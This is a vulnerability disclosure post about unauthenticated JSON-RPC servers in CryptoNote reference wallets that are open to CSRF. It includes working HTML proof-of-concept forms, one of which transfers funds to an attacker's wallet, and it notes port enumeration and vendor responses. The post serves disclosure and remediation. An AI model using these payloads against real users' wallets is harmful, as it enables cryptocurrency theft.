---
layout: post
title: Unauthenticated JSON-RPC API allows takeover of CryptoNote RPC wallets
---

<img src="assets/CryptoNote_OnFire_200s.gif" alt="Cryptonote-img" class="center-image" >

The reference implementation of CryptoNote wallets start a JSON-RPC server
listening on a localhost port that allows an attacker to execute wallet
functions due to a lack of authentication.

An attacker may exploit this vulnerability to steal cryptocurrency from
vulnerable wallets by directing users to visit a webpage hosting the exploit.

# Affected Software

All cryptocurrencies that use the reference CryptoNote walletd and simplewallet
implementations are vulnerable. Notable coins include Bytecoin and Aeon.

# Description

The reference CryptoNote repository comes with two different wallets,
`simplewallet` and `walletd`. Both wallets have JSON-RPC servers that are
vulnerable to similar attacks. Even though the JSON-RPC servers are listening
on localhost, they can be exploited via CSRF.

## walletd

`walletd` has the JSON-RPC server enabled by default. The wallet binds to port
8070 by default.

The below proof-of-concept demonstrates the vulnerability by creating a new
address in the walletd container.

```html
<html>
<form action=http://127.0.0.1:8070/json_rpc method=post enctype="text/plain" >
	<input name='{"params":{},"jsonrpc":"2.0","method":"createAddress", "ignore_me":"' value='test"}'type='hidden'>
<input type=submit>
</form>
</html>
```

## simplewallet

`simplewallet` does not have the JSON-RPC server enabled by default. Enabling
the server requires the `--rpc-bind-port` flag when invoking `simplewallet`.

The below proof-of-concept demonstrates the vulnerability by making a transfer
from the running wallet to an attacker controlled wallet. Change the
INSERT_AMOUNT and INSERT_WALLET_ADDRESS parameters when testing the POC. We
assume that `simplewallet` was invoked with `--rpc-bind-port 8111`.

```html
<html>
<form action=http://127.0.0.1:8111 method=post enctype="text/plain" >
        <input name='{"jsonrpc":"2.0","method":"transfer","params":{"destinations":[{"amount":INSERT_AMOUNT,"address":"INSERT_WALLET_ADDRESS"}],"fee":100,"mixin":0,"unlock_time":0}, "ignore_me":"' value='test"}'type='hidden'>
<input type=submit>
</form>
</html>
```

## Notes on exploitation

While the proof-of-concept code assumes that the server is listening on a
specific port, changing the running port does prevent exploitation. It is
trivial to enumerate open ports with WebSocket.

The proof-of-concept uses a HTML form to demonstrate the attack. However,
exploiting this over Javascript is not an issue due to a lack of CSRF
protection.

# Vendor Response

Attempts have been made to reach out to the CryptoNote and Bytecoin developers
without any success.

Turtlecoin has patched the issue by adding authentication in
[commit 4949e91][turtlecoin-commit].

Aeon has acknowledged the report and is not currently implementing a fix as
they are in the process of rebasing their code. There is minimal risk to Aeon
as `simplewallet` is not used in RPC mode for any official clients.

# Recommended Fix

The JSON-RPC servers should be patched to require authentication on every
request. It is recommended that all forks of CryptoNote and ByteCoin apply
a patch similar to the Turtlecoin fix.

# Credits

This issue was discovered by Ayrx.

Shoutout to @tildalwave for the GIF!

[turtlecoin-commit]: https://github.com/turtlecoin/turtlecoin/commit/4949e91e09bc1d16132090aef4dc09cc6ca09fa1
